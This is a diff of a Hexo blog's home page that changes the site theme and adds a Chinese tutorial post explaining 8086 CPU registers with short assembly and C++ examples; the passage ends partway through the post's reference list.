@@ -1,21 +1,25 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=auto>
-
-
-
+<html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
-  <link rel="icon" href="/img/favicon.png">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="喜欢逆向破解，漏洞挖掘、Web渗透，梦想着成为Mr. Robot">
-  <meta name="author" content="VxerLee">
-  <meta name="keywords" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"vxer-lee.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
   <meta name="description" content="喜欢逆向破解，漏洞挖掘、Web渗透，梦想着成为Mr. Robot">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Lee&#39;s Blog">
@@ -24,824 +28,1749 @@
 <meta property="og:description" content="喜欢逆向破解，漏洞挖掘、Web渗透，梦想着成为Mr. Robot">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:author" content="VxerLee">
-<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://vxer-lee.github.io/page/2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Lee's Blog</title>
   
-  <title>Lee&#39;s Blog</title>
-
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
 
 
 
-<!-- 主题依赖的图标库，不要自行修改 -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
 
 
 
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
 
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
 
-<link  rel="stylesheet" href="/css/main.css" />
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
 
-<!-- 自定义样式保持在最底部 -->
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"vxer-lee.github.io","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Lee's Blog" type="application/atom+xml">
+<link rel="alternate" href="/atom.xml" title="Lee's Blog" type="application/atom+xml">
 </head>
 
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
 
-<body>
-  <header style="height: 100vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>Fluid</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                标签
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
-            </a>
-          </li>
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
-        
-      </ul>
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
     </div>
   </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Lee's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">专注逆向、网络安全</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
 </nav>
 
-    <div class="banner" id="banner" parallax=true
-         style="background: url('/img/default.png') no-repeat center center;
-           background-size: cover;">
-      <div class="full-bg-img">
-        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-          <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="An elegant Material-Design theme for Hexo">
-              
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://vxer-lee.github.io/2021/09/15/DoSASM/Register/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="VxerLee">
+      <meta itemprop="description" content="喜欢逆向破解，漏洞挖掘、Web渗透，梦想着成为Mr. Robot">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lee's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/09/15/DoSASM/Register/" class="post-title-link" itemprop="url">汇编寄存器知识详解</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-09-15 15:14:34" itemprop="dateCreated datePublished" datetime="2021-09-15T15:14:34+08:00">2021-09-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-09-17 15:07:48" itemprop="dateModified" datetime="2021-09-17T15:07:48+08:00">2021-09-17</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PC%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">PC逆向</span></a>
+                </span>
             </span>
 
-            
-          </div>
+          
 
-          
-            <div class="scroll-down-bar">
-              <i class="iconfont icon-arrowdown"></i>
-            </div>
-          
         </div>
-      </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <meta name="referrer" content="no-referrer"/>
+
+<h2 id="寄存器知识"><a href="#寄存器知识" class="headerlink" title="寄存器知识"></a>寄存器知识</h2><p>一个典型的CPU由运算器、控制器、寄存器（CPU工作原理）等器件构成，这些器件靠内部总线相连。</p>
+<ul>
+<li><p>运算器进行信息处理(运算单元)</p>
+</li>
+<li><p>寄存器进行信息存储(存储单元)</p>
+</li>
+<li><p>控制器负责控制各种器件工作(控制单元)</p>
+</li>
+</ul>
+<p>8086CPU中一共有14 个寄存器，所有寄存器都是16位宽，存2个字节，因为是完全的16位微处理器。</p>
+<p><strong>AX，BX，CX，DX，SP，BP，SI，DI，IP，FLAG，CS，DS，SS，ES</strong></p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210910152048114-1326748982.png" alt="image-20210910152047631">  </p>
+<p>这 14 个寄存器有可能进行具体的划分，按照功能可以分为五种：</p>
+<ul>
+<li>通用寄存器</li>
+<li>段寄存器</li>
+<li>偏移寄存器</li>
+<li>IP寄存器</li>
+<li>标志寄存器</li>
+</ul>
+<h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><p>通用寄存器有4个：<strong>AX，BX，CX，DX</strong>，一般用来存放数据，也被称为数据寄存器。</p>
+<p>它们可分为两个可独立使用的8位寄存器</p>
+<p>如下图所示。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210917150739854-364387020.png" alt="img">  </p>
+<p>8086CPU可以一次性处理以下两种尺寸的数据。</p>
+<ul>
+<li>字节：记为byte，一个字节由8个bit组成，可以存在8位寄存器中。</li>
+<li>字：记为word，一个字由两个字节组成，可以存在一个16位寄存器中(16位CPU)</li>
+</ul>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210910153933086-518328246.png" alt="image-20210910153932483"> </p>
+<p>8086采用小端模式：高地址存放高位字节，低地址存放低位字节。</p>
+<p>一个8位寄存器所能存储的数据范围是：0~255  (2的8次方-1)</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210910154911918-1072265149.png" alt="image-20210910154911376">  </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210910155428142-1942123238.png" alt="image-20210910155427382"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210910155506558-1959504272.png" alt="image-20210910155506131"> </p>
+<h3 id="AX寄存器-累加寄存器"><a href="#AX寄存器-累加寄存器" class="headerlink" title="AX寄存器(累加寄存器)"></a>AX寄存器(累加寄存器)</h3><p>AX也叫做累加寄存器，主要用于输入/输出大规模的指令运算。</p>
+<p>以下例子是我在Windows下编译的32位汇编，其中AX扩展成了EAX，我们可以看见乘法(累加)后的结果他其实就是保存到了EAX中，然后再将EAX赋值给整型变量c，所以<code>乘法(imul)</code>和<code>除法(div)</code>运算都会用到AX寄存器,除法会将商保存到ax中，余数保存到dx中。</p>
+<p>编译命令：<code>cl -FAS .\1.cpp</code></p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210910201433297-1080400618.png" alt="image-20210910201432823"> </p>
+<p>可以利用文章<a target="_blank" rel="noopener" href="https://www.cnblogs.com/VxerLee/p/15264290.html%E4%B8%AD%E7%9A%84%E6%96%B9%E6%B3%95%E5%B0%86C%E8%AF%AD%E8%A8%80%E8%BD%AC%E6%8D%A2%E6%88%90DOS%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%EF%BC%8C%E7%84%B6%E5%90%8E%E5%AF%B9%E6%AF%94%E6%BA%90%E7%A0%81%E5%92%8C%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%E5%8F%91%E7%8E%B0%E4%B9%98%E6%B3%95%E7%BB%93%E6%9E%9C%E7%A1%AE%E5%AE%9E%E4%BC%9A%E6%94%BE%E5%85%A5%E5%88%B0ax%E4%B8%AD%E3%80%82">https://www.cnblogs.com/VxerLee/p/15264290.html中的方法将C语言转换成DOS汇编代码，然后对比源码和汇编代码发现乘法结果确实会放入到ax中。</a></p>
+<p>乘法：</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210913191410625-1490516214.png" alt="image-20210913191410502"> </p>
+<p>除法(取余数)：</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210914111834382-1680646863.png" alt="image-20210914111835202"> </p>
+<p>ax还常常被用作函数的返回值。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210914114159904-621011746.png" alt="image-20210914114159719"> </p>
+<h3 id="BX寄存器-寻址寄存器"><a href="#BX寄存器-寻址寄存器" class="headerlink" title="BX寄存器(寻址寄存器)"></a>BX寄存器(寻址寄存器)</h3><p>bx叫做数据寄存器，用来暂存一般数据，不过用的最多的还是用来寻址，bx存放偏移地址，然后根据基地址+偏移进行物理内存地址的定位。</p>
+<p>暂存一般数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov bx,2</span><br><span class="line">add bx,bx</span><br><span class="line">mov ax,bx</span><br></pre></td></tr></table></figure>
+
+<p>用bx寻址：</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210914135730973-410497026.png" alt="image-20210914135730744"> </p>
+<h3 id="CX寄存器-计数寄存器"><a href="#CX寄存器-计数寄存器" class="headerlink" title="CX寄存器(计数寄存器)"></a>CX寄存器(计数寄存器)</h3><p>cx也是叫做数据寄存器,也能暂存一般数据，不过cx还有个专门的用途，根据字面意思c - &gt; “Count”,用来在Loop(循环)时候，用cx寄存器来进行计数指定循环的次数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov  cx,10  ;循环10次</span><br><span class="line">xor  ax,ax</span><br><span class="line">xor  bx,bx  ;存放sum</span><br><span class="line">s:</span><br><span class="line">	int ax  ;</span><br><span class="line">	add bx,ax;&#x2F;bx &#x3D; 1+2+3+4+5+6+7+8+9+10</span><br><span class="line">	loop s</span><br></pre></td></tr></table></figure>
+
+<p>除此之外在Win32汇编中,ecx经常会作为类指针进行传入。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span>&#123;</span></span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">			<span class="keyword">int</span>    age;</span><br><span class="line">			<span class="keyword">char</span> *name;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">			<span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Cat::run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;I&#x27;m a Cat.&quot;</span>  &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;My Name is &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;name &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;age=%d\n&quot;</span>,<span class="keyword">this</span>-&gt;age);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;I&#x27;m Running.....\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Cat maomi;</span><br><span class="line">	maomi.age  = <span class="number">2</span>;</span><br><span class="line">	maomi.name = <span class="string">&quot;xiaohui&quot;</span>;</span><br><span class="line">	maomi.<span class="built_in">run</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进行反汇编后可以发现代码调用<code>maomi.run()</code>的时候会把<code>this指针</code>传入<code>ecx</code>寄存器。<code>lea ecx,dword ptr ss:[x]</code></p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210914145438233-1765858574.png" alt="image-20210914145439088"></p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210914150006818-1741575232.png" alt="image-20210914150007810"> </p>
+<h3 id="DX寄存器"><a href="#DX寄存器" class="headerlink" title="DX寄存器"></a>DX寄存器</h3><p>dx寄存器和之前的寄存器一样，都是能暂存一般数据，在之前的汇编代码中可以发现编译器会将(通用寄存器)和si、di都拿来暂存一般的数据，除此之外之前还介绍过乘法和除法的值也会写入dx中。</p>
+<p>dx用作乘法的时候，用来存储ax寄存器不够存储的高位数据</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210914152838599-2100338053.png" alt="image-20210914152839479"> </p>
+<p>dx用作除法的时候前面介绍过了，用来存储余数。</p>
+<h2 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h2><p>CPU中包含了四个段寄存器，用作程序指令，数据或栈的基础位置。ps:(不过在Windows中好像这些段寄存器没什么用，因为Windows用了平坦模式,每个段的地址都一样都是0，直接用偏移来定位)</p>
+<p>段寄存器主要的功能如下：</p>
+<ul>
+<li><code>CS(Code Segment)</code> ： 代码寄存器，程序代码的基础位置</li>
+<li><code>DS(Data Segment)</code>： 数据寄存器，变量的基本位置</li>
+<li><code>SS(Stack Segment)</code>： 栈寄存器，栈的基础位置</li>
+<li><code>ES(Extra Segment)</code>： 其他寄存器，内存中变量的其他基本位置。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov cs:[xxx],ax</span><br><span class="line">mov ds:[xxx],ax</span><br><span class="line">mov ss:[xxx],ax</span><br><span class="line">mov es:[xxx],ax</span><br></pre></td></tr></table></figure>
+
+<h2 id="偏移-索引-寄存器"><a href="#偏移-索引-寄存器" class="headerlink" title="偏移(索引)寄存器"></a>偏移(索引)寄存器</h2><p>偏移寄存器或者叫索引寄存器，主要是包含段地址的偏移量，用来进行内存地址的定位。</p>
+<ul>
+<li><code>BP(Base Pointer)</code>：基础指针，它是栈寄存器上的偏移量，用来定位栈上变量</li>
+<li><code>SP(Stack Pointer)</code>: 栈指针，它是栈寄存器上的偏移量，用来定位栈顶</li>
+<li><code>SI(Source Index)</code>: 变址寄存器，用来拷贝源字符串</li>
+<li><code>DI(Destination Index)</code>: 目标变址寄存器，用来复制到目标字符串</li>
+</ul>
+<h3 id="BP基础指针寄存器"><a href="#BP基础指针寄存器" class="headerlink" title="BP基础指针寄存器"></a>BP基础指针寄存器</h3><p>用<code>[bp-xx]</code>表示变量</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210914171746160-1570992170.png" alt="image-20210914171745745"> </p>
+<p>用<code>[bp+xx]</code>表示函数参数</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210914182612169-1166698097.png" alt="image-20210914182611731"> </p>
+<p>堆栈数据中<code>bp+6</code>开始就是<code>test</code>函数的第一个参数直到<code>bp+16</code>为止。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210914183856443-1495790330.png" alt="image-20210914183856027"> </p>
+<h3 id="SP栈指针寄存器"><a href="#SP栈指针寄存器" class="headerlink" title="SP栈指针寄存器"></a>SP栈指针寄存器</h3><p>这个其实主要是栈顶指针，无论何时sp指针都执行栈的顶部，[栈是一个从高地址向下生长的内存]。</p>
+<p>push数据时候 sp指针情况(sp地址会减少)</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210914184634435-1913240738.png" alt="image-20210914184634142"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210914184959329-1499835514.png" alt="image-20210914184958415"> </p>
+<p>pop数据时候 sp指针情况(sp地址会增加)</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210914185226406-1434454689.png" alt="image-20210914185226125"> </p>
+<h3 id="SI变址寄存器"><a href="#SI变址寄存器" class="headerlink" title="SI变址寄存器"></a>SI变址寄存器</h3><p>si寄存器是变址寄存器，可以用来存放寻址用的偏移，此外si还被用作隐含的源串地址，默认在DS段中。<br>[无论是si还是di这两个寄存器总感觉和字符串都有点关系,c++的string?]</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">char source[]&#x3D;&quot;hello,world&quot;; (假装&#x3D;esi寄存器)</span><br><span class="line">char dest[]&#x3D;&#123;0&#125;;             (假装&#x3D;edi寄存器)</span><br><span class="line">;----------------------------------------------</span><br><span class="line">mov ecx,strlen(source) ;字符串长度</span><br><span class="line">rep movsb ;重复循环 并且传输字符串</span><br><span class="line">;----------------------------------------------</span><br><span class="line">[dest] &#x3D; &quot;hello,world&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210915135422760-1865092579.png" alt="image-20210915135422905"> </p>
+<h3 id="DI目标变址寄存器"><a href="#DI目标变址寄存器" class="headerlink" title="DI目标变址寄存器"></a>DI目标变址寄存器</h3><p>di寄存器是目标变址寄存器，和si一样可以用来存放寻址用的偏移，此外di还被用作隐含的目的串地址，默认在ES段中。</p>
+<p>先来看看STOS指令的介绍：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">字符串存储指令 STOS </span><br><span class="line"></span><br><span class="line">格式: STOS OPRD</span><br><span class="line"></span><br><span class="line">功能: 把AL(字节)或AX(字)中的数据存储到DI为目的串地址指针所寻址的存储器单元中去.指针DI将根据DF的值进行自动调整.</span><br></pre></td></tr></table></figure>
+
+<p>接下来我们来看看，在汇编语言中是如何实现高级语言中清空数组的操作，以下是一个初始化字符数组的高级代码。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> szMsg[<span class="number">500</span>]=&#123;<span class="number">0</span>&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>翻译后的汇编代码。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210915111540894-1239808845.png" alt="image-20210915111540944"> </p>
+<p>上面的汇编代码执行完后，可以发现szMsg数组的内容全部被清空了。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210915111758868-1393854060.png" alt="image-20210915111759044"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210915112024099-1404625774.png" alt="image-20210915112024226"> </p>
+<h2 id="IP寄存器"><a href="#IP寄存器" class="headerlink" title="IP寄存器"></a>IP寄存器</h2><p><code>IP(Instruction Pointer)</code>： 指令指针寄存器，它是从 Code Segment 代码寄存器处的偏移来存储执行的下一条指令。</p>
+<h2 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h2><p>就剩下两种寄存器还没聊了，这两种寄存器是指令指针寄存器和标志寄存器：</p>
+<ul>
+<li><code>FLAG</code> : Flag 寄存器用于存储当前进程的状态，这些状态有<ul>
+<li>位置 (Direction)：用于数据块的传输方向，是向上传输还是向下传输</li>
+<li>中断标志位 (Interrupt) ：1 - 允许；0 - 禁止</li>
+<li>陷入位 (Trap) ：确定每条指令执行完成后，CPU 是否应该停止。1 - 开启，0 - 关闭</li>
+<li>进位 (Carry) : 设置最后一个无符号算术运算是否带有进位</li>
+<li>溢出 (Overflow) : 设置最后一个有符号运算是否溢出</li>
+<li>符号 (Sign) : 如果最后一次算术运算为负，则设置 1 =负，0 =正</li>
+<li>零位 (Zero) : 如果最后一次算术运算结果为零，1 = 零</li>
+<li>辅助进位 (Aux Carry) ：用于第三位到第四位的进位</li>
+<li>奇偶校验 (Parity) : 用于奇偶校验</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>参考文献：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39654127/article/details/88698911">https://blog.csdn.net/qq_39654127/article/details/88698911</a> 《王爽汇编笔记》<br><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000037478310%E3%80%8A%E5%8D%81%E4%B8%80%E5%81%87%E6%9C%9F%E6%B7%A6%E4%BA%86%E5%85%AB%E5%A4%A9%E5%AF%84%E5%AD%98%E5%99%A8%E7%9A%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E3%80%8B">https://segmentfault.com/a/1190000037478310《十一假期淦了八天寄存器的相关知识》</a><br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/cpp/build/reference/fa-fa-listing-file?view=msvc-160%E3%80%8A/FA/Fa%E4%BD%BF%E7%94%A8%E3%80%8B">https://docs.microsoft.com/zh-cn/cpp/build/reference/fa-fa-listing-file?view=msvc-160《/FA/Fa使用》</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/bagboy_taobao_com/article/details/6203705">https://blog.csdn.net/bagboy_taobao_com/article/details/6203705</a> 